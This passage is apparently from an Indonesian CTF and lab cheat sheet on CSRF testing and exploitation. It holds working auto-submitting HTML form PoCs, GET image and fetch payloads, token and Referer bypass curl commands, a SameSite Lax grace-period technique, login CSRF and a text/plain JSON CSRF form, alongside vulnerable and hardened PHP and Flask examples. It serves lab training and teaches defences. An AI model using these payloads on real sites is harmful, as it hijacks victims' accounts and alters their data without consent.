---
id: "29"
title: "🛡️ 29 — CSRF Workflow"
category: "3. Web Exploitation"
categoryId: "web"
filename: "29_csrf_workflow.md"
refs_out: ["20","28","33","34"]
refs_in: ["28","30","31","33","34"]
---

← [File 28: JWT](/docs/jwt)

# 🛡️ 29 — CSRF Workflow

> **Scope:** HackTheBox, TryHackMe, PortSwigger Academy, dan lab/CTF yang memang memberikan izin pengujian.  
> **OS:** Parrot OS XFCE / Debian-based  
> **Level:** Beginner → Intermediate  
> **Tujuan:** membangun _muscle memory_ CSRF dari menemukan state-changing request → mengidentifikasi authentication → menganalisis token/SameSite/Origin → membuat PoC → memahami chaining dengan XSS/CORS/OAuth/JWT.

---

# 📚 Daftar Isi

- [🛡️ 0. Fundamentals](#-0-fundamentals)
    
    - [0.1 Apa Itu CSRF](#01-apa-itu-csrf)
        
    - [0.2 Attack Surface CSRF](#02-attack-surface-csrf)
        
    - [0.3 SameSite vs CORS vs CSRF Token](#03-perbedaan-samesite-cors-csrf-token)
        
- [🔎 1. Reconnaissance](#-1-reconnaissance)
    
    - [1.1 Identifikasi Target CSRF](#11-identifikasi-target-csrf)
        
    - [1.2 Tools untuk CSRF Analysis](#12-tools-untuk-csrf-analysis)
        
    - [1.3 CSRF Token Analysis](#13-csrf-token-analysis)
        
- [💥 2. Exploitation Techniques](#-2-exploitation-teknik)
    
    - [2.1 Basic CSRF — POST](#21-basic-csrf--post-request)
        
    - [2.2 Basic CSRF — GET](#22-basic-csrf--get-request)
        
    - [2.3 Token Bypass — Validation Absent](#23-csrf-token-bypass--validation-absent)
        
    - [2.4 Token Not Tied to Session](#24-csrf-token-bypass--token-not-tied-to-session)
        
    - [2.5 Token in URL](#25-csrf-token-bypass--token-in-url)
        
    - [2.6 Validation by Method](#26-csrf-token-bypass--validation-on-method)
        
    - [2.7 SameSite Cookie Bypass](#27-samesite-cookie-bypass)
        
    - [2.8 Referer-Based CSRF Bypass](#28-referer-based-csrf-bypass)
        
    - [2.9 Login CSRF](#29-login-csrf)
        
    - [2.10 JSON CSRF](#210-json-csrf)
        
    - [2.11 Stored CSRF](#211-stored-csrf)
        
- [🧪 3. CSRF PoC Generation](#-3-csrf-poc-generation)
    
    - [3.1 HTML PoC Templates](#31-html-poc-templates)
        
    - [3.2 Burp Suite Generate CSRF PoC](#32-burp-suite-generate-csrf-poc)
        
    - [3.3 csrf_poc_generator.sh](#33-script-csrf_poc_generatorsh)
        
- [🔐 4. Defense Mechanisms](#-4-defense-mechanisms)
    
    - [4.1 CSRF Token Analysis](#41-csrf-token-analysis)
        
    - [4.2 SameSite Analysis](#42-samesite-analysis)
        
    - [4.3 Origin/Referer Check Analysis](#43-originreferer-check-analysis)
        
- [🔗 5. Chained Attacks](#-5-chained-attacks)
    
    - [5.1 CSRF + XSS](#51-csrf--xss)
        
    - [5.2 CSRF + Stored XSS](#52-csrf--stored-xss)
        
    - [5.3 CSRF + CORS](#53-csrf--cors)
        
    - [5.4 CSRF + OAuth](#54-csrf--oauth)
        
- [🌳 6. Decision Tree](#-6-decision-tree)
    
- [🛠️ 7. Common Errors & Troubleshooting](#-7-common-errors--troubleshooting)
    
- [📏 8. Golden Rules](#-8-golden-rules)
    
- [✅ 9. Final Checklist](#-9-final-checklist)
    
- [🔀 10. Cross-Workflow](#-10-cross-workflow)
    
- [🧠 11. One-Line Muscle Memory](#-11-one-line-muscle-memory)
    

---

# 🛡️ 0. Fundamentals

# 0.1 Apa Itu CSRF

## 📌 Kapan Digunakan

Gunakan konsep CSRF ketika sebuah website:

```text
authenticated user
        +
browser otomatis menyertakan credential
        +
attacker dapat menyebabkan request tertentu dikirim
```

CSRF = **Cross-Site Request Forgery**.

Model mental paling sederhana:

> Attacker tidak perlu mengetahui password korban. Attacker mencoba membuat **browser korban** mengirim request yang diinginkan ke target sambil browser tetap membawa credential yang berlaku.

---

## Model Mental

```text
        ATTACKER
           │
           │ halaman berbahaya
           ▼
     ┌─────────────┐
     │   Browser   │
     │    Korban   │
     └──────┬──────┘
            │
            │ Cookie/session otomatis
            ▼
     ┌─────────────┐
     │ Target Site │
     │ bank/app    │
     └──────┬──────┘
            │
            ▼
       State Change
```

Attacker memulai dari:

```text
attacker.example
```

tetapi request akhirnya menuju:

```text
target.example
```

dengan credential browser korban.

---

## Tiga Kondisi yang Harus Ada

Untuk CSRF klasik berbasis cookie, tiga kondisi utama yang perlu dicari adalah:

```text
1. Authentication otomatis
   │
   └── browser mengirim cookie/session

2. Request dapat ditebak/dibentuk
   │
   └── attacker bisa membuat request yang relevan

3. Request memiliki side effect
   │
   └── change email / password / transfer / settings
```

Diagram:

```text
Cookie-based Auth
       │
       ▼
Predictable Request
       │
       ▼
State-changing Action
       │
       ▼
     CSRF
```

Jika salah satu bagian penting tidak terpenuhi, CSRF klasik mungkin tidak berhasil.

---

## Authentication ≠ CSRF

Contoh:

```text
Victim sudah login
Cookie:
session=ABC123
```

Victim membuka halaman attacker.

Attacker menyebabkan:

```http
POST /change-email
Cookie: session=ABC123
```

Browser korban mengirim request.

Server melihat:

```text
session=ABC123
```

dan menganggap:

```text
"Ini user yang authenticated."
```

Kalau tidak ada proteksi anti-CSRF yang efektif, request palsu dapat diproses.

---

# CSRF vs XSS vs Clickjacking

|Vulnerability|Inti Masalah|Siapa yang mengeksekusi?|Contoh|
|---|---|---|---|
|CSRF|Memaksa request authenticated|Browser korban|Ubah email|
|XSS|Menjalankan JavaScript di origin target|JavaScript korban|Script berjalan di target origin|
|Clickjacking|Menipu user melakukan klik|User + UI overlay|Klik tombol transfer|
|CSRF + XSS|XSS dapat melakukan same-origin actions|JavaScript korban|Request authenticated otomatis|

---

## CSRF

```text
Attacker Page
     │
     ▼
Victim Browser
     │
     ▼
Target Request
     │
     ▼
State Change
```

---

## XSS

```text
Target Page
     │
     ▼
Injected Script
     │
     ▼
Runs as Target Origin
```

---

## Clickjacking

```text
Attacker UI
    │
    ▼
Invisible / misleading frame
    │
    ▼
Victim Click
    │
    ▼
Target Action
```

---

# Kenapa CSRF Bisa Low atau Critical?

CSRF tidak mempunyai severity tetap.

Contoh low impact:

```text
ubah preference bahasa
```

Medium:

```text
change profile information
```

High:

```text
change email
change password
```

Critical:

```text
fund transfer
API key regeneration
admin privilege modification
destructive state change
```

Model:

```text
CSRF
 │
 ▼
Business Impact
 │
 ├── preference
 ├── profile
 ├── credential
 ├── financial
 └── administrative
```

Jadi jangan menilai CSRF hanya dari nama vulnerability. **Impact endpoint menentukan severity.**

---

# PHP Vulnerable vs Aman

## ❌ Vulnerable

```php
<?php
session_start();

if ($_POST['email']) {
    $email = $_POST['email'];

    // Tidak ada CSRF token validation.
    update_email($_SESSION['user_id'], $email);
}
?>

<form method="POST" action="/change-email">
    <input name="email">
    <button type="submit">Change</button>
</form>
```

---

## ✅ Lebih Aman

```php
<?php
session_start();

if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    $token = $_POST['csrf_token'] ?? '';

    if (
        !hash_equals(
            $_SESSION['csrf_token'],
            $token
        )
    ) {
        http_response_code(403);
        exit('Invalid CSRF token');
    }

    $email = $_POST['email'] ?? '';

    update_email(
        $_SESSION['user_id'],
        $email
    );
}
?>

<form method="POST" action="/change-email">
    <input type="hidden"
           name="csrf_token"
           value="<?= htmlspecialchars($_SESSION['csrf_token']) ?>">

    <input name="email">

    <button type="submit">Change</button>
</form>
```

Intinya:

```text
session token
      │
      ▼
hidden CSRF token
      │
      ▼
server verifies equality
      │
      ▼
state change
```

---

# Flask Vulnerable vs Aman

## ❌ Vulnerable

```python
from flask import Flask, request, session

app = Flask(__name__)

@app.post("/change-email")
def change_email():
    email = request.form["email"]

    update_email(
        session["user_id"],
        email
    )

    return "OK"
```

---

## ✅ Lebih Aman

```python
import secrets

from flask import (
    Flask,
    request,
    session
)

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)


@app.get("/profile")
def profile():

    if "csrf_token" not in session:
        session["csrf_token"] = secrets.token_urlsafe(32)

    return render_template(
        "profile.html",
        csrf_token=session["csrf_token"]
    )


@app.post("/change-email")
def change_email():

    supplied = request.form.get("csrf_token", "")
    expected = session.get("csrf_token", "")

    if not expected or not supplied:
        return "CSRF validation failed", 403

    if not secrets.compare_digest(
        supplied,
        expected
    ):
        return "CSRF validation failed", 403

    email = request.form.get("email", "")

    update_email(
        session["user_id"],
        email
    )

    return "OK"
```

---

# 0.2 Attack Surface CSRF

|Location|Typical Action|Impact|
|---|---|---|
|Form submission POST|Change profile|Medium|
|GET side effect|Delete/change setting|Medium–Critical|
|JSON request|Change API resource|High|
|Multipart form|Upload/change object|Medium–High|
|PUT/DELETE override|Update/delete object|High|
|GraphQL mutation|Modify resource|High|
|State-changing GET|Account action|Medium–Critical|
|Password change|Credential modification|Critical|
|Email change|Account recovery change|High–Critical|
|Payment form|Transaction|Critical|
|API key rotation|Credential generation|High|
|Admin setting|Privilege/configuration change|Critical|

---

# 0.3 Perbedaan SameSite, CORS, CSRF Token

|Mekanisme|Bekerja di mana?|Tujuan utama|Mencegah request CSRF?|Membaca response?|
|---|---|---|---|---|
|CSRF Token|Server/application|Membuktikan request berasal dari trusted UI|✅ jika validasi benar|Tidak relevan|
|SameSite|Browser/cookie layer|Membatasi kapan cookie dikirim cross-site|✅ untuk banyak cookie-CSRF cases|Tidak mengatur response read|
|CORS|Browser fetch/XHR policy|Mengontrol origin yang boleh membaca response|❌ bukan CSRF defense|✅ mengontrol read access|

Poin paling penting:

```text
CORS
   ≠
CSRF protection
```

Browser bisa saja:

```text
send request ✅
read response ❌
```

Jadi CORS dapat mencegah attacker membaca response, tetapi tidak otomatis mencegah request side effect terkirim.

---

# SameSite

`SameSite` memiliki tiga nilai utama:

```text
Strict
Lax
None
```

`Strict` membatasi cookie pada request dari same-site context. `Lax` masih mengizinkan cookie pada cross-site top-level navigation tertentu dengan method aman seperti GET. `None` mengizinkan cross-site sending dan membutuhkan `Secure`.

---

# 🔎 1. Reconnaissance

# 1.1 Identifikasi Target CSRF

## 📌 Kapan Digunakan

Mulai dari **state-changing request**, bukan dari halaman login.

Cari:

```text
POST /change-email
POST /change-password
POST /profile
POST /transfer
POST /settings
POST /delete
```

dan:

```text
GET /delete
GET /enable
GET /change
```

yang memiliki side effect.

---

## Trace Normal Browse

```text
Login
  │
  ▼
Dashboard
  │
  ▼
Profile
  │
  ▼
Change Email
  │
  ▼
Submit
  │
  ▼
Burp captures request
```

---

## Checklist: Bisa di-CSRF?

```text
[ ] User authenticated?
[ ] Authentication otomatis dikirim?
[ ] Request state-changing?
[ ] Request dapat direproduksi?
[ ] CSRF token ada?
[ ] Token divalidasi?
[ ] Token tied ke session?
[ ] SameSite cookie?
[ ] Origin/Referer validation?
[ ] Request membutuhkan custom header?
[ ] Request membutuhkan JSON Content-Type?
[ ] CORS policy relevan?
```

---

## Cari Request Tanpa Token

Contoh:

```http
POST /change-email HTTP/1.1
Host: target.htb
Cookie: session=abc123
Content-Type: application/x-www-form-urlencoded

email=attacker@example.com
```

Tidak ada:

```text
csrf_token
X-CSRF-Token
X-XSRF-TOKEN
```

Ini **candidate**, bukan otomatis vulnerability.

---

## Request dengan Token

```http
POST /change-email HTTP/1.1
Host: target.htb
Cookie: session=abc123
Content-Type: application/x-www-form-urlencoded

email=test@example.com&csrf_token=abc123xyz
```

Cari token:

```text
hidden field
header
cookie
query
body
```

---

# 1.2 Tools untuk CSRF Analysis

# Burp Suite

## 📌 Kapan Digunakan

Gunakan Burp sebagai primary manual tool.

Workflow:

```text
Browser
   │
   ▼
Burp Proxy
   │
   ▼
State-changing Request
   │
   ▼
Repeater
   │
   ├── normal
   ├── remove token
   ├── change token
   ├── method change
   └── Origin/Referer test
```

---

## curl

Replay request:

```bash
# Replay state-changing request
curl -i \
  -X POST \
  'http://TARGET/change-email' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Cookie: session=LAB_SESSION' \
  --data-urlencode 'email=test@example.com'
```

---

## Browser DevTools

```text
F12
→ Network
→ Action
→ Request
```

Periksa:

```text
Request URL
Method
Cookie
Origin
Referer
Content-Type
CSRF token
```

---

## ffuf

### 📌 Kapan Digunakan

Untuk menemukan endpoint yang mungkin memiliki state-changing functionality.

```bash
# Discover common application endpoints
ffuf \
  -u http://TARGET/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -mc 200,301,302,307,401,403
```

Cari nama:

```text
profile
settings
account
change-email
change-password
delete
transfer
update
```

---

# 1.3 CSRF Token Analysis

## 📌 Kapan Digunakan

Setelah menemukan state-changing request yang memiliki token.

---

## Lokasi Token

### Hidden Field

```html
<input
    type="hidden"
    name="csrf_token"
    value="RANDOM_TOKEN">
```

### Header

```http
X-CSRF-Token: RANDOM_TOKEN
```

### Cookie

```http
Set-Cookie: XSRF-TOKEN=RANDOM_TOKEN
```

### Parameter

```text
POST /change-email

email=test@example.com
csrf_token=RANDOM_TOKEN
```

---

## Token Format

Cari:

```text
length
charset
entropy
timestamp
user binding
session relation
```

Contoh:

```text
abc123
```

lebih mencurigakan daripada:

```text
5df7bdbac9c0f0f8cde1e8...
```

Tetapi panjang saja tidak membuktikan security.

---

## Test Token Validation

Baseline:

```bash
# Submit valid token
curl -i \
  -X POST \
  'http://TARGET/change-email' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Cookie: session=LAB_SESSION' \
  --data-urlencode 'email=a@example.com' \
  --data-urlencode 'csrf_token=VALID_TOKEN'
```

Remove token:

```bash
# Remove CSRF token completely
curl -i \
  -X POST \
  'http://TARGET/change-email' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Cookie: session=LAB_SESSION' \
  --data-urlencode 'email=b@example.com'
```

Invalid token:

```bash
# Replace token with an invalid value
curl -i \
  -X POST \
  'http://TARGET/change-email' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Cookie: session=LAB_SESSION' \
  --data-urlencode 'email=c@example.com' \
  --data-urlencode 'csrf_token=INVALID_TOKEN'
```

Interpretation:

```text
VALID    → 200
MISSING  → 403
INVALID  → 403
```

= validation likely exists.

---

# 💥 2. Exploitation Teknik

# 2.1 Basic CSRF — POST Request

## 📌 Kapan Digunakan

Saat:

```text
POST
+
cookie authentication
+
no effective CSRF defense
+
predictable body
+
state change
```

---

## Original Request

```http
POST /change-email HTTP/1.1
Host: target.htb
Cookie: session=LAB_SESSION
Content-Type: application/x-www-form-urlencoded

email=attacker@example.com
```

---

## HTML PoC

```html
<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>CSRF Lab PoC</title>
</head>
<body>

<form
    id="csrf-form"
    action="http://TARGET/change-email"
    method="POST">

    <input
        type="hidden"
        name="email"
        value="attacker@example.com">

</form>

<script>
    document.getElementById("csrf-form").submit();
</script>

</body>
</html>
```

---

## Host di Parrot

```bash
# Create a directory for the PoC
mkdir -p ~/csrf-lab

# Save PoC HTML
nano ~/csrf-lab/csrf.html

# Start a local HTTP server
cd ~/csrf-lab
python3 -m http.server 8000
```

Expected:

```text
Serving HTTP on 0.0.0.0 port 8000
```

Open:

```text
http://127.0.0.1:8000/csrf.html
```

Pada remote CTF target, victim browser harus dapat menjangkau host PoC.

---

## Test dengan curl

```bash
# Replay the same state-changing request manually
curl -i \
  -X POST \
  'http://TARGET/change-email' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Cookie: session=LAB_SESSION' \
  --data-urlencode 'email=attacker@example.com'
```

Expected:

```http
HTTP/1.1 302 Found
Location: /profile
Set-Cookie: ...
```

atau:

```http
HTTP/1.1 200 OK
```

---

## Verify

Jangan hanya melihat `200 OK`.

Cek state:

```text
Profile
   │
   ▼
Email
   │
   ▼
attacker@example.com
```

Bukti terbaik:

```text
GET /profile
```

menunjukkan email berubah.

---

# 2.2 Basic CSRF — GET Request

## 📌 Kapan Digunakan

Saat aplikasi menggunakan GET untuk state-changing action.

Contoh:

```text
GET /change-email?email=attacker@example.com
```

Ini desain buruk karena GET seharusnya tidak digunakan untuk state changes.

---

## `<img>` PoC

```html
<!doctype html>
<html>
<body>

<img
    src="http://TARGET/change-email?email=attacker%40example.com"
    alt="csrf">

</body>
</html>
```

Browser dapat mencoba mengambil URL tersebut sebagai image resource.

---

## `<a>` PoC

```html
<a
    href="http://TARGET/change-email?email=attacker%40example.com">
    Click here
</a>
```

---

## `fetch()` PoC

```html
<!doctype html>
<html>
<body>

<script>
fetch(
    "http://TARGET/change-email?email=attacker%40example.com",
    {
        credentials: "include"
    }
);
</script>

</body>
</html>
```

Tetapi `fetch()` cross-origin memiliki batas browser/CORS dan cookie policy. Jangan menganggap konfigurasi ini setara dengan HTML form.

---

## curl

```bash
# Replay the state-changing GET request directly
curl -i \
  -X GET \
  'http://TARGET/change-email?email=attacker%40example.com' \
  -H 'Cookie: session=LAB_SESSION'
```

---

# 2.3 CSRF Token Bypass — Validation Absent

## 📌 Kapan Digunakan

Saat request memiliki token tetapi server ternyata tidak mewajibkannya.

Original:

```http
POST /change-email

email=a@example.com
csrf_token=VALID_TOKEN
```

Test:

```bash
# Remove the token completely
curl -i \
  -X POST \
  'http://TARGET/change-email' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Cookie: session=LAB_SESSION' \
  --data-urlencode 'email=attacker@example.com'
```

---

## Expected Vulnerable Result

```http
HTTP/1.1 302 Found
Location: /profile
```

Kemudian:

```text
Email:
attacker@example.com
```

---

# 2.4 CSRF Token Bypass — Token Not Tied to Session

## 📌 Kapan Digunakan

Saat application memiliki dua akun pada lab:

```text
Attacker Account
Victim Account
```

dan token mungkin bersifat global/reusable.

---

## Step 1 — Account A

Login attacker.

Dapatkan:

```text
session=A_SESSION
csrf=A_TOKEN
```

---

## Step 2 — Account B

Login victim.

Dapatkan:

```text
session=B_SESSION
csrf=B_TOKEN
```

---

## Step 3 — Cross-Test

Gunakan:

```text
session=B_SESSION
csrf=A_TOKEN
```

```bash
# Use victim session with attacker-owned CSRF token
curl -i \
  -X POST \
  'http://TARGET/change-email' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Cookie: session=VICTIM_SESSION' \
  --data-urlencode 'email=attacker@example.com' \
  --data-urlencode 'csrf_token=ATTACKER_TOKEN'
```

Expected secure:

```http
HTTP/1.1 403 Forbidden
```

Potential vulnerable:

```http
HTTP/1.1 302 Found
```

dan state berubah.

---

## Security Logic

Secure:

```text
Session A ↔ Token A
Session B ↔ Token B
```

Broken:

```text
Token A
   │
   ├── Session A ✅
   ├── Session B ✅
   └── Session C ✅
```

Jika server tidak mengikat token ke session/user, protection dapat dilemahkan.

---

# 2.5 CSRF Token Bypass — Token in URL

## 📌 Kapan Digunakan

Saat token berada di:

```text
GET /change-email?email=x&csrf_token=TOKEN
```

atau URL navigations.

Masalah tambahan:

```text
URL
 │
 ├── browser history
 ├── access logs
 ├── analytics
 ├── Referer leakage
 └── screenshots
```

---

## Query vs Body

Query:

```text
/change-email?email=a@example.com&csrf_token=ABC
```

Body:

```text
POST /change-email

email=a@example.com
csrf_token=ABC
```

---

## curl

```bash
# Test token exposed in query string
curl -i \
  'http://TARGET/change-email?email=attacker%40example.com&csrf_token=VALID_TOKEN' \
  -H 'Cookie: session=LAB_SESSION'
```

Potential issue:

```text
Token in URL
      │
      ▼
GET navigation
      │
      ├── history
      ├── logs
      └── referrer-related leakage
```

---

# 2.6 CSRF Token Bypass — Validation on Method

## 📌 Kapan Digunakan

Saat aplikasi memproses request yang sama melalui beberapa methods.

Contoh:

```text
POST → checks CSRF
GET  → doesn't
```

---

## Test GET

```bash
# Test whether the same state change works over GET
curl -i \
  'http://TARGET/change-email?email=attacker%40example.com' \
  -H 'Cookie: session=LAB_SESSION'
```

---

## Method Override

Some frameworks support:

```text
_method=DELETE
```

Test pada lab:

```bash
# Test framework method override
curl -i \
  -X POST \
  'http://TARGET/account/delete' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Cookie: session=LAB_SESSION' \
  --data-urlencode '_method=DELETE'
```

Potential vulnerable flow:

```text
POST
 │
 └── server interprets _method=DELETE
          │
          ▼
        DELETE
```

Jika token hanya diperiksa pada POST semantics dan tidak pada overridden method, protection dapat gagal.

---

# 2.7 SameSite Cookie Bypass

> **Penting:** jangan menganggap semua SameSite bypass universal. Perilaku bergantung pada site relationship, scheme, request type, browser, cookie configuration, redirect chain, dan browser privacy features. `Lax` memang mengizinkan cross-site top-level navigation GET tertentu; `Strict` jauh lebih ketat; `None` mengizinkan cross-site sending dan membutuhkan `Secure`.

## SameSite=Strict

### 📌 Kapan Digunakan

Analisis saat:

```http
Set-Cookie: session=ABC; SameSite=Strict
```

Cross-site navigation biasanya tidak membawa cookie tersebut.

Contoh:

```html
<a href="https://TARGET/change-setting?x=1">
    Open target
</a>
```

Secara konsep:

```text
attacker.example
      │
      ▼
TARGET
      │
      X cookie mungkin tidak terkirim
```

`Strict` secara desain mencegah cookie dikirim dalam cross-site browsing contexts.

---

## SameSite=Strict — Same-Site Subdomain

### 📌 Kapan Digunakan

Ini **bukan bypass otomatis**.

Perhatikan perbedaan:

```text
same-origin
vs
same-site
```

Contoh:

```text
evil.target.example
target.example
```

bisa berada dalam site yang sama walaupun origin berbeda.

Diagram:

```text
evil.target.example
       │
       │ same-site relationship
       ▼
target.example
```

Risikonya meningkat bila attacker sudah mengendalikan subdomain yang dipercaya dalam site boundary atau terdapat aplikasi rentan pada subdomain tersebut.

---

## SameSite=Lax

### 📌 Kapan Digunakan

Saat:

```http
Set-Cookie: session=ABC; SameSite=Lax
```

Cross-site subrequests seperti:

```text
<img>
<script>
fetch()
iframe
```

umumnya tidak menerima cookie Lax.

Tetapi top-level navigation GET dapat membawa cookie.

---

## Lax + State-Changing GET

Jika target memiliki:

```text
GET /delete-account
```

maka:

```html
<a href="http://TARGET/delete-account">
    Continue
</a>
```

dapat menjadi dangerous karena top-level GET adalah case yang Lax masih izinkan.

---

## Lax + Top-Level Navigation

```html
<!doctype html>
<html>
<body>

<a
    href="http://TARGET/change-setting?enabled=true">
    Continue
</a>

</body>
</html>
```

Request type:

```text
cross-site
+
top-level navigation
+
GET
```

adalah kombinasi yang paling perlu diperiksa pada aplikasi yang memakai Lax dan salah menggunakan GET untuk state changes.

---

## SameSite=Lax — Chrome Grace Period (Penting untuk Lab!)

### 📌 Kapan Digunakan
Chrome memiliki behavior khusus (**grace period 2 menit**) untuk **fresh cookies** (cookie baru dibuat < 2 menit):

```text
Cookie baru dibuat (via Login / Session Refresh)
    │
    ▼
Umur cookie < 2 menit?
    │
    ┌───┴───┐
   YES      NO
    │        │
    ▼        ▼
Chrome      Lax normal
masih       behavior (blok
mengirim    cross-site
cookie      POST)
cross-site
POST
```

Exploit Flow:

```bash
# Step 1: Force victim untuk mendapatkan fresh session cookie (misal via Login CSRF)
# Step 2: Dalam kurun waktu < 2 menit, pemicu CSRF POST dijalankan

# Cara cek di DevTools:
# Application → Cookies → Cek timestamp/creation time cookie
```

> **⚠️ Lab Note:** Teknik ini sering muncul di PortSwigger labs dengan judul *"Bypassing SameSite Lax restrictions using newly issued cookies"*.

---

## SameSite=None

### 📌 Kapan Digunakan

Cookie:

```http
Set-Cookie: session=ABC; SameSite=None; Secure
```

mengizinkan cross-site cookie sending.

Tidak diperlukan “bypass” SameSite-nya sendiri.

Tetapi:

```text
Secure
```

harus ada ketika `SameSite=None` digunakan.

Test:

```html
<form
    action="https://TARGET/change-email"
    method="POST">

    <input
        type="hidden"
        name="email"
        value="attacker@example.com">

    <button>Submit</button>

</form>
```

---

## Missing SameSite

### 📌 Kapan Digunakan

Saat response:

```http
Set-Cookie: session=ABC; Secure; HttpOnly
```

tidak menyebut:

```text
SameSite=
```

Jangan langsung menulis:

```text
"Cookie selalu cross-site."
```

Default behavior browser dapat menerapkan `Lax` ketika attribute tidak ada, dan detail behavior dapat berbeda menurut browser/privacy model.

---

# Browser Behavior Table

> **📌 Catatan Penting Browser Behavior & Privacy Policy:**
> - **Chrome 80+**: Mengubah default behavior cookie tanpa attribute SameSite dari `None` menjadi `Lax`. Chrome juga menerapkan 2-minute Lax grace period untuk fresh cookies pada POST cross-site.
> - **Safari (WebKit ITP)**: Memiliki *Intelligent Tracking Prevention* yang dapat memblokir third-party cookies secara ketat di luar spesifikasi standar SameSite.
> - **Firefox (ETP)**: Menggunakan *Enhanced Tracking Protection* yang membatasi tracking cookies secara dinamis.
> - **CTF / Lab Recommendation**: Selalu jalankan testing pada browser yang digunakan oleh platform lab (biasanya Chrome/Chromium versi terbaru) dan gunakan **DevTools (Application → Cookies & Network)** sebagai sumber kebenaran.

|Browser|`Strict`|`Lax`|`None`|Missing attribute|
|---|---|---|---|---|
|Chrome/Chromium|Very restrictive cross-site|Top-level safe navigation behavior (dengan 2-min POST grace period)|Cross-site + `Secure`|Default `Lax` (sejak Chrome 80+)|
|Firefox|Very restrictive cross-site|Top-level safe navigation behavior|Cross-site + `Secure`|Default `Lax` (ETP enabled)|
|Safari|Very restrictive + WebKit ITP|Top-level navigation behavior|Requires `Secure` + ITP restrictions|Restricted by ITP policy|

Jangan membuat workflow berdasarkan browser table saja. **DevTools → Application/Storage + Network** adalah sumber kebenaran untuk browser yang benar-benar digunakan dalam challenge.

---

# 2.8 Referer-Based CSRF Bypass

## 📌 Kapan Digunakan

Saat server memiliki logic:

```text
if Referer starts with expected-domain:
    allow
```

---

## Remove Referer

Test:

```bash
# Send request without an explicit Referer header
curl -i \
  -X POST \
  'http://TARGET/change-email' \
  -H 'Cookie: session=LAB_SESSION' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'email=attacker@example.com'
```

Potential result:

```text
200
```

padahal request sebelumnya selalu membutuhkan Referer.

---

## Strict Referer Check

Misalnya server mengharuskan:

```text
https://target.htb/profile
```

Test variations:

```bash
# Exact trusted path
curl -i \
  -X POST \
  'http://TARGET/change-email' \
  -H 'Cookie: session=LAB_SESSION' \
  -H 'Referer: https://target.htb/profile' \
  --data-urlencode 'email=test@example.com'
```

---

## Lenient Subdomain Check

Misalnya implementation hanya melakukan:

```text
Referer contains "target.htb"
```

Test pada owned/lab subdomain:

```bash
# Test a same-site lab subdomain
curl -i \
  -X POST \
  'http://TARGET/change-email' \
  -H 'Cookie: session=LAB_SESSION' \
  -H 'Referer: https://sub.target.htb/attacker' \
  --data-urlencode 'email=test@example.com'
```

**String matching yang ceroboh** berbeda dari validating origin secara benar.

---

# 2.9 Login CSRF

## 📌 Kapan Digunakan

Login CSRF terjadi ketika attacker dapat membuat browser korban login ke **akun attacker**.

Contoh:

```text
Attacker account
     │
     ▼
attacker credentials
     │
     ▼
Victim Browser
     │
     ▼
Target Login
     │
     ▼
Victim now operates as attacker
```

---

## Impact

Impact menjadi penting ketika victim kemudian memasukkan:

```text
credit card
personal data
API token
private information
```

ke dalam akun attacker.

Attacker dapat kemudian melihat data yang korban masukkan ke akun tersebut.

---

## Session Fixation Relation

Login CSRF dapat berkaitan dengan session management:

```text
Attacker Session
      │
      ▼
Victim forced into session/account
      │
      ▼
Victim adds sensitive data
      │
      ▼
Attacker reads account
```

Tidak semua login CSRF adalah session fixation, tetapi keduanya dapat muncul dalam chain yang sama.

---

## PoC HTML

```html
<!doctype html>
<html lang="en">
<body>

<form
    id="login"
    action="http://TARGET/login"
    method="POST">

    <input
        type="hidden"
        name="username"
        value="attacker">

    <input
        type="hidden"
        name="password"
        value="ATTACKER_PASSWORD">

</form>

<script>
    document.getElementById("login").submit();
</script>

</body>
</html>
```

---

# 2.10 JSON CSRF

## 📌 Kapan Digunakan

Saat state-changing API mengharapkan JSON:

```http
Content-Type: application/json
```

Contoh:

```json
{
  "email": "attacker@example.com"
}
```

---

## Kenapa JSON Lebih Sulit?

Native HTML form klasik tidak dapat menetapkan arbitrary:

```text
Content-Type: application/json
```

tanpa mekanisme lain.

Cross-origin `fetch()` dengan non-simple content type biasanya memicu CORS preflight:

```text
OPTIONS
   │
   ▼
CORS policy
   │
   ▼
POST JSON
```

Namun jangan salah:

```text
CORS blocks reading
```

tidak sama dengan:

```text
server cannot receive any request
```

---

## `text/plain` Trick

Jika backend buruk dan menerima:

```text
Content-Type: text/plain
```

tetapi tetap mem-parse body sebagai JSON, form cross-origin dapat menjadi kandidat.

```html
<!doctype html>
<html>
<body>

<form
    action="http://TARGET/api/change-email"
    method="POST"
    enctype="text/plain">

    <input
        type="hidden"
        name='{"email":"attacker@example.com","x":"'
        value='"}'>

</form>

<script>
document.forms[0].submit();
</script>

</body>
</html>
```

Hasil body yang dikirim dapat menyerupai:

```text
{"email":"attacker@example.com","x":"="}
```

**Ini hanya bekerja jika server parser menerima `text/plain` sebagai JSON atau memproses body dengan cara yang tidak semestinya.**

---

## Cross-Origin `fetch()`

```html
<script>
fetch("http://TARGET/api/change-email", {
    method: "POST",
    credentials: "include",
    headers: {
        "Content-Type": "application/json"
    },
    body: JSON.stringify({
        email: "attacker@example.com"
    })
});
</script>
```

Dalam kondisi normal, cross-origin JSON request biasanya membutuhkan CORS preflight dan server harus mengizinkannya untuk browser melanjutkan request tersebut.

---

## curl

```bash
# Directly reproduce the JSON request
curl -i \
  -X POST \
  'http://TARGET/api/change-email' \
  -H 'Content-Type: application/json' \
  -H 'Cookie: session=LAB_SESSION' \
  --data '{"email":"attacker@example.com"}'
```

---

# 2.11 Stored CSRF

## 📌 Kapan Digunakan

Saat CSRF payload dapat disimpan di:

```text
comment
profile
ticket
message
post
notification
```

Flow:

```text
Attacker
   │
   ▼
Stored Payload
   │
   ▼
Database
   │
   ▼
Victim/Admin opens page
   │
   ▼
Payload triggers request
   │
   ▼
State change
```

---

## Example Scenario
